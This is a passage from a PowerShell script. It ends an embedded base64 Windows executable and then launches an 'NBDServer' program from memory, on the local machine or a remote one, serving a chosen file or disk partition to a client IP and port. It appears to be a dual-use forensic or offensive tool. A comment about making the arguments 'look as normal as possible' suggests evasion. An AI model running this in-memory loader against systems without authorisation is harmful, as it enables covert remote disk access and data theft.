AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAQAYAAAAGAAAgAAAAAAAAAAABAAAAAAAAQABAAAAMAAAgAAAAAAAAAAABAAAAAAAAQAJBAAASAAAAFjQAABaAQAA5AQAAAAAAAA8YXNzZW1ibHkgeG1sbnM9InVybjpzY2hlbWFzLW1pY3Jvc29mdC1jb206YXNtLnYxIiBtYW5pZmVzdFZlcnNpb249IjEuMCI+DQogIDx0cnVzdEluZm8geG1sbnM9InVybjpzY2hlbWFzLW1pY3Jvc29mdC1jb206YXNtLnYzIj4NCiAgICA8c2VjdXJpdHk+DQogICAgICA8cmVxdWVzdGVkUHJpdmlsZWdlcz4NCiAgICAgICAgPHJlcXVlc3RlZEV4ZWN1dGlvbkxldmVsIGxldmVsPSJhc0ludm9rZXIiIHVpQWNjZXNzPSJmYWxzZSI+PC9yZXF1ZXN0ZWRFeGVjdXRpb25MZXZlbD4NCiAgICAgIDwvcmVxdWVzdGVkUHJpdmlsZWdlcz4NCiAgICA8L3NlY3VyaXR5Pg0KICA8L3RydXN0SW5mbz4NCjwvYXNzZW1ibHk+UEFQQURESU5HWFhQQURESU5HUEFERElOR1hYUEFERElOR1BBRERJTkdYWFBBRERJTkdQQURESU5HWFhQQURESU5HUEFERElOR1hYUEFEAHAAACwAAACApIikkKSYpLCkuKTQpNik4KTopMCvyK/Qr+Cv6K/wr/ivAAAAgAAAKAAAAACgCKAQoBigIKAooDCgOKBAoEigUKBYoGCgaKB4oICgALAAACQAAAAAoECgkKDYoAChKKFwocChEKJgoqiiAKMIozCjAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="

    #Add a "program name" to exeargs, just so the string looks as normal as possible (real args start indexing at 1)
    $ExeArgs = "NBDServer"

    if($ClientIP -and ($ClientIP -ne "")) {
        $ExeArgs += " -c $ClientIP"
    }
    if($ListenPort -and ($ListenPort -ne "")) {
        $ExeArgs += " -p $ListenPort"
    }
    if($FileToServe -and ($FileToServe -ne "")) {
        $ExeArgs += " -f $FileToServe"
    }
    if($PartitionToServe -and ($PartitionToServe -ne "")) {
        $ExeArgs += " -n $PartitionToServe"
    }

    Write-Verbose "$ExeArgs: $ExeArgs"

    [System.IO.Directory]::SetCurrentDirectory($pwd)

    if ($ComputerName -eq $null -or $ComputerName -imatch "^\s*$")
    {
        Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, "Void", 0, "", $ExeArgs)
    }
    else
    {
        Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, "Void", 0, "", $ExeArgs) -ComputerName $ComputerName
    }
}

Main
}